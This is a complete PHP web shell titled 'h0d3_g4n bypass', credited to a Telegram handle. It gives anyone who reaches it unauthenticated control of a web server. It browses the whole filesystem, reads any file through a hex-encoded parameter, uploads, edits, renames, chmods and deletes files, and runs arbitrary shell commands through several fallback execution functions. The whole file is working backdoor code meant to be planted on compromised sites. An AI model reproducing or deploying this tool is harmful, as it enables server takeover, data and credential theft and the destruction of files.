<?php
ini_set('display_errors',1);
ini_set('display_startup_errors',1);
error_reporting(E_ALL);

// Fungsi konversi
function strToHex($s){$h='';for($i=0;$i<strlen($s);$i++)$h.=sprintf("%02x",ord($s[$i]));return $h;}
function hexToStr($h){$s='';for($i=0;$i<strlen($h);$i+=2)$s.=chr(hexdec($h[$i].$h[$i+1]));return $s;}
function formatSize($s){$u=['B','KB','MB','GB','TB'];$i=0;while($s>=1024&&$i<4){$s/=1024;$i++;} return round($s,2).' '.$u[$i];}
function getFileDetails($p){
    $f=[]; $d=[]; $i=@scandir($p);
    if(!is_array($i)) return [];
    foreach($i as $it){
        if($it=='.'||$it=='..') continue;
        $fp=$p.'/'.$it;
        $det=[
            'name'=>$it,
            'type'=>is_dir($fp)?'Folder':'File',
            'size'=>is_dir($fp)?'':formatSize(filesize($fp)),
            'permission'=>substr(sprintf('%o',fileperms($fp)),-4)
        ];
        is_dir($fp)?$d[]=$det:$f[]=$det;
    }
    return array_merge($d,$f);
}
function changeDirectory($p){$p==='..'?@chdir('..'):@chdir($p);}
function getCurrentDirectory(){return realpath(getcwd());}
function getLink($p,$n){ // Generate link
    return is_dir($p)
        ? '<a href="?dir='.urlencode(strToHex($p)).'">'.htmlspecialchars($n).'</a>'
        : '<a href="#" onclick="openEditModalHex(\''.urlencode(strToHex($p)).'\'); return false;">'.htmlspecialchars($n).'</a>';
}
function showBreadcrumb($p){
    $p=str_replace('\\','/',$p);
    $paths=explode('/',$p);
    echo '<div class="breadcrumb"><a href="?dir='.urlencode(strToHex('/')).'">/</a>';
    $acc='';
    foreach($paths as $pa){
        if($pa==='') continue;
        $acc.='/'.$pa;
        echo '<a href="?dir='.urlencode(strToHex($acc)).'">'.htmlspecialchars($pa).'</a>/';
    }
    echo '</div>';
}

// Inisialisasi
$curDir=getCurrentDirectory();
$msg=''; $cmdOutput='';

// Penanganan permintaan
if(isset($_GET['get_filename'])) {
    echo basename(hexToStr($_GET['get_filename']));
    exit;
}
if(isset($_GET['ambil-lc-cok'])) {
    $f=hexToStr($_GET['ambil-lc-cok']);
    if(file_exists($f)) echo file_get_contents($f);
    exit;
}
if(isset($_GET['dir'])) {
    changeDirectory(hexToStr($_GET['dir']));
    $curDir=getCurrentDirectory();
}
if(isset($_POST['new_folder']) && !empty($_POST['folder_name'])) {
    $path=$curDir.'/'.$_POST['folder_name'];
    if(!file_exists($path)) mkdir($path,0755,true);
    $msg='Folder created.';
}
if(isset($_POST['new_file']) && !empty($_POST['file_name'])) {
    file_put_contents($curDir.'/'.$_POST['file_name'], $_POST['file_content'] ?? '');
    $msg='File created.';
}
if(isset($_POST['upload_file']) && isset($_FILES['uploaded_file'])) {
    move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $curDir.'/'.$_FILES['uploaded_file']['name']);
    $msg='File uploaded.';
}
if(isset($_POST['edit_file'])) {
    $file=hexToStr($_POST['edit_file']);
    if(file_exists($file)){
        $c=isset($_POST['content']) ? $_POST['content'] : '';
        if(isset($_POST['mode']) && $_POST['mode']==='Y') $c=base64_decode($c);
        if(file_put_contents($file,$c))
            $msg='File berhasil diedit.';
        else
            $msg='Gagal mengedit file.';
    }
}
if(isset($_POST['rename_path']) && !empty($_POST['new_name'])) {
    $old=hexToStr($_POST['rename_path']);
    $new=dirname($old).'/'.$_POST['new_name'];
    if(file_exists($old)) rename($old,$new);
    $msg='Renamed successfully.';
}
if(isset($_POST['chmod_path']) && !empty($_POST['chmod_value'])) {
    chmod(hexToStr($_POST['chmod_path']), intval($_POST['chmod_value'],8));
    $msg='Permission changed.';
}
if(isset($_POST['delete_path'])) {
    $f=hexToStr($_POST['delete_path']);
    if(is_file($f)) unlink($f);
    elseif(is_dir($f)){
        foreach(glob($f.'/*') as $fi)
            is_dir($fi)?rmdir($fi):unlink($fi);
        rmdir($f);
    }
    $msg='Deleted successfully.';
}
if(isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $c=$_POST['cmd'];
    try {
        if(function_exists('shell_exec'))
            $cmdOutput=shell_exec($c.' 2>&1');
        elseif(function_exists('exec')){
            exec($c.' 2>&1',$o);
            $cmdOutput=implode("\n",$o);
        }
        elseif(function_exists('passthru')){
            ob_start();
            passthru($c.' 2>&1');
            $cmdOutput=ob_get_clean();
        }
        elseif(function_exists('system')){
            ob_start();
            system($c.' 2>&1');
            $cmdOutput=ob_get_clean();
        }
        elseif(function_exists('proc_open')){
            $d=array(0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']);
            $p=proc_open($c,$d,$pipes);
            if(is_resource($p)){
                $cmdOutput=stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($p);
            }
        } else {
            $cmdOutput='Command execution disabled.';
        }
    } catch(Exception $e) {
        $cmdOutput='Error: '.$e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
/* CSS styles (tetap sama) */
body{font-family:'Segoe UI',Tahoma,sans-serif;margin:20px;background:#f4f6f8;color:#333;}
h1{color:#333;}
.breadcrumb a{text-decoration:none;margin-right:5px;color:#3498db;}
.breadcrumb a:hover{text-decoration:underline;}
.toolbar{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:20px;align-items:flex-start;}
.toolbar form{display:flex;flex-direction:column;gap:5px;background:#fff;padding:10px;border-radius:8px;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
input[type=text],textarea,input[type=file]{padding:8px;border:1px solid #ccc;border-radius:5px;font-size:14px;}
button.button{padding:8px 15px;background:#3498db;color:#fff;border:none;border-radius:5px;cursor:pointer;transition:0.3s;}
button.button:hover{background:#2980b9;}
table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 5px rgba(0,0,0,0.1);}
th,td{padding:12px 15px;text-align:left;}
th{background:#3498db;color:#fff;font-weight:normal;}
tr:nth-child(even){background:#f9f9f9;}
tr:hover{background:#f1f1f1;}
a.action-link{color:#3498db;text-decoration:none;margin-right:5px;}
a.action-link:hover{text-decoration:underline;}
textarea{resize:vertical;}
#notification{display:none;position:fixed;top:20px;right:20px;background:#2ecc71;color:#fff;padding:15px;border-radius:8px;z-index:1000;box-shadow:0 2px 10px rgba(0,0,0,0.3);}
.modal{display:none;position:fixed;z-index:999;left:0;top:0;width:100%;height:100%;overflow:auto;background:rgba(0,0,0,0.6);}
.modal-content{background:#fff;margin:5% auto;padding:20px;border-radius:8px;width:90%;max-width:900px;box-shadow:0 2px 10px rgba(0,0,0,0.3);}
.close{color:#aaa;float:right;font-size:28px;font-weight:bold;cursor:pointer;}
.close:hover{color:#000;}
textarea#modal-textarea{width:100%;height:400px;font-family:monospace;font-size:14px;}
@media(max-width:768px){.toolbar{flex-direction:column;}textarea#modal-textarea{height:250px;}}
</style>
</head>
<body>
<h1>h0d3_g4n bypass</h1>
<?php if($msg)echo'<div id="notification">'.$msg.'</div>'; ?>
<?php showBreadcrumb($curDir); ?>
<div class="toolbar">
    <form method="get"><button type="submit" class="button">Home</button></form>
    <form method="post"><input type="text" name="folder_name" placeholder="New Folder Name"><button type="submit" name="new_folder" class="button">Create Folder</button></form>
    <form method="post"><input type="text" name="file_name" placeholder="New File Name"><textarea name="file_content" placeholder="File Content" rows="2"></textarea><button type="submit" name="new_file" class="button">Create File</button></form>
    <form method="post" enctype="multipart/form-data"><input type="file" name="uploaded_file" required><button type="submit" name="upload_file" class="button">Upload</button></form>
    <form method="post"><input type="text" name="cmd" placeholder="Enter command"><button type="submit" class="button">Execute</button></form>
</div>
<?php if($cmdOutput)echo'<pre style="background:#fff;padding:10px;border-radius:8px;box-shadow:0 2px 5px rgba(0,0,0,0.1);height:200px;overflow:auto;">'.htmlspecialchars($cmdOutput).'</pre>'; ?>
<table>
<tr><th>Name</th><th>Type</th><th>Size</th><th>Permission</th><th>Actions</th></tr>
<?php
foreach(getFileDetails($curDir) as $f){
    $full=$curDir.'/'.$f['name'];
    echo '<tr>
    <td>'.getLink($full,$f['name']).'</td>
    <td>'.$f['type'].'</td>
    <td>'.$f['size'].'</td>
    <td>'.$f['permission'].'</td>
    <td>
        <a href="#" onclick="openEditModalHex(\''.urlencode(strToHex($full)).'\'); return false;" class="action-link">Edit</a> |
        <a href="#" onclick="openRenameModal(\''.urlencode(strToHex($full)).'\'); return false;" class="action-link">Rename</a> |
        <a href="#" onclick="openChmodModal(\''.urlencode(strToHex($full)).'\'); return false;" class="action-link">Chmod</a> |
        <a href="#" onclick="openDeleteModal(\''.urlencode(strToHex($full)).'\'); return false;" class="action-link">Delete</a>
    </td></tr>';
}
?>
</table>

<!-- Modals for Edit, Rename, Chmod, Delete -->
<!-- Edit Modal -->
<div id="editModal" class="modal">
  <div class="modal-content">
    <span class="close" onclick="closeEditModal()">&times;</span>
    <h2>Edit File</h2>
    <form method="post" id="editForm">
      <textarea id="editContent" name="content"></textarea>
      <input type="hidden" name="edit_file" id="editFileHex" value="">
      <br>
      <label><input type="checkbox" name="mode" value="Y"> Base64 Encode</label>
      <br><br>
      <button type="submit" class="button">Save</button>
    </form>
  </div>
</div>

<!-- Rename Modal -->
<div id="renameModal" class="modal">
  <div class="modal-content">
    <span class="close" onclick="closeRenameModal()">&times;</span>
    <h2>Rename</h2>
    <form method="post" id="renameForm">
      <input type="hidden" name="rename_path" id="renamePathHex" value="">
      <input type="text" name="new_name" placeholder="New Name" required>
      <br><br>
      <button type="submit" class="button">Rename</button>
    </form>
  </div>
</div>

<!-- Chmod Modal -->
<div id="chmodModal" class="modal">
  <div class="modal-content">
    <span class="close" onclick="closeChmodModal()">&times;</span>
    <h2>Change Permissions (Chmod)</h2>
    <form method="post" id="chmodForm">
      <input type="hidden" name="chmod_path" id="chmodPathHex" value="">
      <input type="text" name="chmod_value" placeholder="e.g., 755" required>
      <br><br>
      <button type="submit" class="button">Change</button>
    </form>
  </div>
</div>

<!-- Delete Modal -->
<div id="deleteModal" class="modal">
  <div class="modal-content">
    <span class="close" onclick="closeDeleteModal()">&times;</span>
    <h2>Delete Confirmation</h2>
    <form method="post" id="deleteForm">
      <input type="hidden" name="delete_path" id="deletePathHex" value="">
      <p>Are you sure you want to delete this item?</p>
      <button type="submit" class="button">Yes, Delete</button>
      <button type="button" class="button" onclick="closeDeleteModal()">Cancel</button>
    </form>
  </div>
</div>

<script>
// Notification
function showNotification(msg){ 
  var notif=document.getElementById('notification');
  notif.innerText=msg;
  notif.style.display='block';
  setTimeout(()=>{notif.style.display='none';},3000);
}
<?php if($msg) echo "showNotification('".addslashes($msg)."');"; ?>

// Modal functions
function openEditModalHex(hexPath){
  document.getElementById('editFileHex').value=hexPath;
  // Load content via AJAX
  fetch('?ambil-lc-cok='+hexPath)
    .then(res=>res.text())
    .then(data=>{
      document.getElementById('editContent').value=data;
      document.getElementById('editModal').style.display='block';
    });
}
function closeEditModal(){ document.getElementById('editModal').style.display='none'; }

// Rename
function openRenameModal(path){
  document.getElementById('renamePathHex').value=path;
  document.getElementById('renameModal').style.display='block';
}
function closeRenameModal(){ document.getElementById('renameModal').style.display='none'; }

// Chmod
function openChmodModal(path){
  document.getElementById('chmodPathHex').value=path;
  document.getElementById('chmodModal').style.display='block';
}
function closeChmodModal(){ document.getElementById('chmodModal').style.display='none'; }

// Delete
function openDeleteModal(path){
  document.getElementById('deletePathHex').value=path;
  document.getElementById('deleteModal').style.display='block';
}
function closeDeleteModal(){ document.getElementById('deleteModal').style.display='none'; }

// Handle modal clicks outside
window.onclick=function(e){
  if(e.target==document.getElementById('editModal'))closeEditModal();
  if(e.target==document.getElementById('renameModal'))closeRenameModal();
  if(e.target==document.getElementById('chmodModal'))closeChmodModal();
  if(e.target==document.getElementById('deleteModal'))closeDeleteModal();
}
</script>

<div style="text-align:center;margin-top:20px;font-size:14px;color:#666;">
    © 2025 Coded By <b>h0d3_g4n</b> | Telegram: <a href="https://t.me/h0d3_g4n" target="_blank">@h0d3_g4n</a>
</div>
</body>
</html>